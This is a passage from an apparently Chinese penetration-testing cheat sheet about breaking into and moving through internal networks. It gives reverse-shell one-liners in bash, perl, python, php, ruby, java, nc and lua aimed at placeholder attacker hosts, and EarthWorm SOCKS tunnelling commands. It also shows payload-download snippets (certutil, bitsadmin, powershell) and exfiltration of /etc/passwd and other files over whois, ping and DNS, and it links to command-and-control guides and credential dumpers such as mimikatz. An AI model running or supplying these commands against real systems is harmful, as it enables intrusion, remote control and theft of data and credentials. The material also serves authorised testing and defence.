<li>GetDomainsBySSL.py :<a href="https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/" target="_blank" rel="noopener">https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</a></li>
<li>censys.io证书 :<a href="https://censys.io/certificates?q=target.com" target="_blank" rel="noopener">https://censys.io/certificates?q=target.com</a></li>
<li>crt.sh证书查询:<a href="https://crt.sh/?q=%25.target.com" target="_blank" rel="noopener">https://crt.sh/?q=%25.target.com</a></li>
<li>shadon :<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
<li>zoomeye :<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></li>
<li>fofa :<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li>
<li>censys：<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li>
<li>dnsdb.io :<a href="https://dnsdb.io/zh-cn/search?q=target.com" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/search?q=target.com</a></li>
<li>api.hackertarget.com :<a href="http://api.hackertarget.com/reversedns/?q=target.com" target="_blank" rel="noopener">http://api.hackertarget.com/reversedns/?q=target.com</a></li>
<li>community.riskiq.com :<a href="https://community.riskiq.com/Search/target.com" target="_blank" rel="noopener">https://community.riskiq.com/Search/target.com</a></li>
<li>subdomain3 :<a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a></li>
<li>FuzzDomain :<a href="https://github.com/Chora10/FuzzDomain" target="_blank" rel="noopener">https://github.com/Chora10/FuzzDomain</a></li>
<li>dnsdumpster.com :<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li>
<li>phpinfo.me :<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></li>
<li>dns开放数据接口 :<a href="https://dns.bufferover.run/dns?q=baidu.com" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=baidu.com</a></li>
</ul>
<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="基于企业弱账号漏洞"><a href="#基于企业弱账号漏洞" class="headerlink" title="基于企业弱账号漏洞"></a>基于企业弱账号漏洞</h3><ul>
<li>VPN（通过邮箱，密码爆破，社工等途径获取VPN） </li>
<li>企业相关运维系统（zabbix等） </li>
</ul>
<h3 id="基于系统漏洞进入"><a href="#基于系统漏洞进入" class="headerlink" title="基于系统漏洞进入"></a>基于系统漏洞进入</h3><ul>
<li>Metasploit(漏洞利用框架):<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a> </li>
<li>漏洞利用脚本 </li>
</ul>
<h3 id="网站应用程序渗透"><a href="#网站应用程序渗透" class="headerlink" title="网站应用程序渗透"></a>网站应用程序渗透</h3><ul>
<li>SQL注入 </li>
<li>跨站脚本（XSS） </li>
<li>跨站请求伪造（CSRF） </li>
<li>SSRF（<a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">ssrf_proxy</a>） </li>
<li>功能/业务逻辑漏洞 </li>
<li>其他漏洞等 </li>
<li>CMS-内容管理系统漏洞 </li>
<li>企业自建代理 </li>
</ul>
<h3 id="无线Wi-Fi接入"><a href="#无线Wi-Fi接入" class="headerlink" title="无线Wi-Fi接入"></a>无线Wi-Fi接入</h3><h2 id="隐匿攻击"><a href="#隐匿攻击" class="headerlink" title="隐匿攻击"></a>隐匿攻击</h2><h3 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h3><ul>
<li>ICMP :<a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">https://pentestlab.blog/2017/07/28/command-and-control-icmp/</a></li>
<li>DNS :<a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>
<li>DropBox :<a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/29/command-and-control-dropbox/</a></li>
<li>Gmail :<a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/03/command-and-control-gmail/</a></li>
<li>Telegram :<a href="http://drops.xmd5.com/static/drops/tips-16142.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-16142.html</a></li>
<li>Twitter :<a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/26/command-and-control-twitter/</a></li>
<li>Website Keyword :<a href="https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/</a></li>
<li>PowerShell :<a href="https://pentestlab.blog/2017/08/19/command-and-control-powershell/" target="_blank" rel="noopener">https://pentestlab.blog/2017/08/19/command-and-control-powershell/</a></li>
<li>Windows COM :<a href="https://pentestlab.blog/2017/09/01/command-and-control-windows-com/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/01/command-and-control-windows-com/</a></li>
<li>WebDAV :<a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">https://pentestlab.blog/2017/09/12/command-and-control-webdav/</a></li>
<li>Office 365 :<a href="https://www.anquanke.com/post/id/86974" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86974</a></li>
<li>HTTPS :<a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/04/command-and-control-https/</a></li>
<li>Kernel :<a href="https://pentestlab.blog/2017/10/02/command-and-control-kernel/" target="_blank" rel="noopener">https://pentestlab.blog/2017/10/02/command-and-control-kernel/</a></li>
<li>Website :<a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/14/command-and-control-website/</a></li>
<li>WMI :<a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
<li>WebSocket :<a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">https://pentestlab.blog/2017/12/06/command-and-control-websocket/</a></li>
<li>Images :<a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/02/command-and-control-images/</a></li>
<li>Web Interface :<a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/03/command-and-control-web-interface/</a></li>
<li>JavaScript :<a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">https://pentestlab.blog/2018/01/08/command-and-control-javascript/</a></li>
<li>… </li>
</ul>
<h3 id="Fronting"><a href="#Fronting" class="headerlink" title="Fronting"></a>Fronting</h3><ul>
<li><a href="https://evi1cg.me/archives/Domain_Fronting.html" target="_blank" rel="noopener">Domain Fronting </a></li>
<li><a href="https://evi1cg.me/archives/Tor_Fronting.html" target="_blank" rel="noopener">Tor_Fronting.</a></li>
</ul>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>VPN </li>
<li>shadowsockts :<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks</a></li>
<li>HTTP :<a href="http://cn-proxy.com/" target="_blank" rel="noopener">http://cn-proxy.com/</a></li>
<li>Tor </li>
</ul>
<h2 id="内网跨边界应用"><a href="#内网跨边界应用" class="headerlink" title="内网跨边界应用"></a>内网跨边界应用</h2><h3 id="内网跨边界转发"><a href="#内网跨边界转发" class="headerlink" title="内网跨边界转发"></a>内网跨边界转发</h3><ul>
<li><a href="https://blog.csdn.net/l_f0rm4t3d/article/details/24004555" target="_blank" rel="noopener">NC端口转发</a> </li>
<li><a href="http://blog.chinaunix.net/uid-53401-id-4407931.html" target="_blank" rel="noopener">LCX端口转发 </a></li>
<li><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">nps</a></li>
<li>代理脚本 <ol>
<li><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna </a></li>
<li><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">Reduh </a></li>
</ol>
</li>
<li>… </li>
</ul>
<h3 id="内网跨边界代理穿透"><a href="#内网跨边界代理穿透" class="headerlink" title="内网跨边界代理穿透"></a>内网跨边界代理穿透</h3><h4 id="EW"><a href="#EW" class="headerlink" title="EW"></a><a href="https://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">EW</a></h4><p>正向 SOCKS v5 服务器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
<p> 反弹 SOCKS v5 服务器:<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
<p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rssocks -d 1.1.1.1 -e 8888</span><br></pre></td></tr></table></figure>
<p>多级级联</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_tran 的用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>lcx_listen、lcx_slave 的用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s ssocksd -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure>
<p>“三级级联”的本地SOCKS测试用例以供参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_listen -l 9999 -e 7777</span><br><span class="line">$ .&#x2F;ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure>
<h4 id="Termite"><a href="#Termite" class="headerlink" title="Termite"></a><a href="https://rootkiter.com/Termite/" target="_blank" rel="noopener">Termite</a></h4><p>使用说明:<a href="https://rootkiter.com/Termite/README.txt" target="_blank" rel="noopener">https://rootkiter.com/Termite/README.txt</a> </p>
<h4 id="代理脚本"><a href="#代理脚本" class="headerlink" title="代理脚本"></a>代理脚本</h4><p>reGeorg :<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
<h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><p>bash  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>perl </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
<p>python </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>php </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
<p>ruby </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
<p>java </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>nc </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用-e </span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 223.8.200.234 1234</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#不使用-e</span><br><span class="line">mknod &#x2F;tmp&#x2F;backpipe p</span><br><span class="line">&#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe | nc attackerip listenport 1&gt;&#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure>

<p>lua </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>

<h3 id="内网文件的传输和下载"><a href="#内网文件的传输和下载" class="headerlink" title="内网文件的传输和下载"></a>内网文件的传输和下载</h3><p>wput </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wput dir_name ftp:&#x2F;&#x2F;linuxpig:123456@host.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>wget </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;site.com&#x2F;1.rar -O 1.rar</span><br></pre></td></tr></table></figure>
<p>ariac2（需安装） </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c -o owncloud.zip https:&#x2F;&#x2F;download.owncloud.org&#x2F;community&#x2F;owncloud-9.0.0.tar.bz2</span><br></pre></td></tr></table></figure>
<p>powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$p &#x3D; New-Object System.Net.WebClient </span><br><span class="line">$p.DownloadFile(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;,&quot;C:%homepath%file&quot;)</span><br></pre></td></tr></table></figure>
<p>vbs脚本 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set args &#x3D; Wscript.Arguments</span><br><span class="line">Url &#x3D; &quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;</span><br><span class="line">dim xHttp: Set xHttp &#x3D; createobject(&quot;Microsoft.XMLHTTP&quot;)</span><br><span class="line">dim bStrm: Set bStrm &#x3D; createobject(&quot;Adodb.Stream&quot;)</span><br><span class="line">xHttp.Open &quot;GET&quot;, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">.type &#x3D; 1 &#39;</span><br><span class="line">.open</span><br><span class="line">.write xHttp.responseBody</span><br><span class="line">.savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;</span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行 ：cscript test.vbs</p>
</blockquote>
<p>Perl </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl </span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(&quot;http:&#x2F;&#x2F;domain&#x2F;file&quot;, &quot;file&quot;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：perl test.pl</p>
</blockquote>
<p>Python </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python </span><br><span class="line">import urllib2 </span><br><span class="line">u &#x3D; urllib2.urlopen(&#39;http:&#x2F;&#x2F;domain&#x2F;file&#39;) </span><br><span class="line">localFile &#x3D; open(&#39;local_file&#39;, &#39;w&#39;) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：python test.py</p>
</blockquote>
<p>Ruby </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;ruby</span><br><span class="line">require &#39;net&#x2F;http&#39;</span><br><span class="line">Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|</span><br><span class="line">r &#x3D; http.get(&quot;&#x2F;file&quot;)</span><br><span class="line">open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：ruby test.rb</p>
</blockquote>
<p>PHP </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url  &#x3D; &#39;http:&#x2F;&#x2F;www.example.com&#x2F;file&#39;;</span><br><span class="line">$path &#x3D; &#39;&#x2F;path&#x2F;to&#x2F;file&#39;;</span><br><span class="line">$ch &#x3D; curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$data &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">file_put_contents($path, $data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行：php test.php</p>
</blockquote>
<p>NC<br>attacker </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
<p>target</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
<p>FTP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file exit</span><br></pre></td></tr></table></figure>
<p>TFTP </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
<p>Bitsadmin </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:%homepath%file</span><br></pre></td></tr></table></figure>
<p>Window 文件共享 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use x: \127.0.0.1\share &#x2F;user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
<p>SCP<br>本地到远程 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp file user@host.com:&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p>远程到本地 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp user@host.com:&#x2F;tmp file</span><br></pre></td></tr></table></figure>
<p>rsync<br>远程rsync服务器中拷贝文件到本地机 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av root@192.168.78.192::www &#x2F;databack</span><br></pre></td></tr></table></figure>
<p>本地机器拷贝文件到远程rsync服务器 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsync -av &#x2F;databack root@192.168.78.192::www</span><br></pre></td></tr></table></figure>
<p>certutil.exe </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;site.com&#x2F;file</span><br></pre></td></tr></table></figure>
<p>copy</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\IP\ShareName\file.exe file.exe</span><br></pre></td></tr></table></figure>
<p>WHOIS<br>接收端 Host B：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d</span><br></pre></td></tr></table></figure>
<p>发送端 Host A：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois -h host_ip -p 1337 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96;</span><br></pre></td></tr></table></figure>

<p><a href="https://twitter.com/mubix/status/1102780436118409216" target="_blank" rel="noopener">WHOIS + TAR</a><br>First:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it</span><br></pre></td></tr></table></figure>

<p>Next</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar czf - &#x2F;tmp&#x2F;* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</span><br></pre></td></tr></table></figure>

<p>Finally</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat files.b64 | tr -d &#39;\r\n&#39; | base64 -d | tar zxv #to get the files out</span><br></pre></td></tr></table></figure>

<p>PING<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>ping_receiver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(ICMP):</span><br><span class="line">        if pkt[ICMP].type &#x3D;&#x3D; 8:</span><br><span class="line">            data &#x3D; pkt[ICMP].load[-4:]</span><br><span class="line">            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 ping_receiver.py</span><br></pre></td></tr></table></figure>

<p>DIG<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>dns_reciver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(DNS):</span><br><span class="line">        domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)</span><br><span class="line">        root_domain &#x3D; domain.split(&#39;.&#39;)[1]</span><br><span class="line">        if root_domain.startswith(&#39;gooogle&#39;):</span><br><span class="line">            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dns_reciver.py</span><br></pre></td></tr></table></figure>
<p>… </p>
<h3 id="搭建-HTTP-server"><a href="#搭建-HTTP-server" class="headerlink" title="搭建 HTTP server"></a>搭建 HTTP server</h3><p>python2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure>
<p>python3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 1337</span><br></pre></td></tr></table></figure>
<p>PHP 5.4+</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:1337</span><br></pre></td></tr></table></figure>
<p>ruby</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port &#x3D;&gt; 1337, :DocumentRoot &#x3D;&gt; Dir.pwd).start&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -run -e httpd . -p 1337</span><br></pre></td></tr></table></figure>
<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MHTTP::Server::Brick -e &#39;$s&#x3D;HTTP::Server::Brick-&gt;new(port&#x3D;&gt;1337); $s-&gt;mount(&quot;&#x2F;&quot;&#x3D;&gt;&#123;path&#x3D;&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;.&#x2F;$1 |&quot; : $1) if &#x2F;^GET \&#x2F;(.*) &#x2F; &#125;)&#39;</span><br></pre></td></tr></table></figure>
<p>busybox httpd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure>



<h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="1、用户列表"><a href="#1、用户列表" class="headerlink" title="1、用户列表"></a>1、用户列表</h4><p>windows用户列表<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 </p>
<h4 id="2、进程列表"><a href="#2、进程列表" class="headerlink" title="2、进程列表"></a>2、进程列表</h4><p>析杀毒软件/安全监控工具等<br>邮件客户端<br>VPN<br>ftp等  </p>
<h4 id="3、服务列表"><a href="#3、服务列表" class="headerlink" title="3、服务列表"></a>3、服务列表</h4><p>与安全防范工具有关服务[判断是否可以手动开关等]<br>存在问题的服务[权限/漏洞]</p>
<h4 id="4、端口列表"><a href="#4、端口列表" class="headerlink" title="4、端口列表"></a>4、端口列表</h4><p>开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]<br>利用端口进行信息收集</p>
<h4 id="5、补丁列表"><a href="#5、补丁列表" class="headerlink" title="5、补丁列表"></a>5、补丁列表</h4><p>分析 Windows 补丁<br>第三方软件[Java/Oracle/Flash 等]漏洞</p>
<h4 id="6、本机共享"><a href="#6、本机共享" class="headerlink" title="6、本机共享"></a>6、本机共享</h4><p>本机共享列表/访问权限<br>本机访问的域共享/访问权限</p>
<h4 id="7、本用户习惯分析"><a href="#7、本用户习惯分析" class="headerlink" title="7、本用户习惯分析"></a>7、本用户习惯分析</h4><p>历史记录<br>收藏夹<br>文档等 </p>
<h4 id="8、获取当前用户密码工具"><a href="#8、获取当前用户密码工具" class="headerlink" title="8、获取当前用户密码工具"></a>8、获取当前用户密码工具</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><ul>
<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>  </li>
<li><a href="https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64" target="_blank" rel="noopener">wce</a>  </li>
<li><a href="https://github.com/peewpw/Invoke-WCMDump" target="_blank" rel="noopener">Invoke-WCMDump  </a></li>
<li><a href="https://github.com/giMini/mimiDbg" target="_blank" rel="noopener">mimiDbg  </a></li>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a></li>
<li><a href="http://launcher.nirsoft.net/downloads/" target="_blank" rel="noopener">nirsoft_package</a></li>
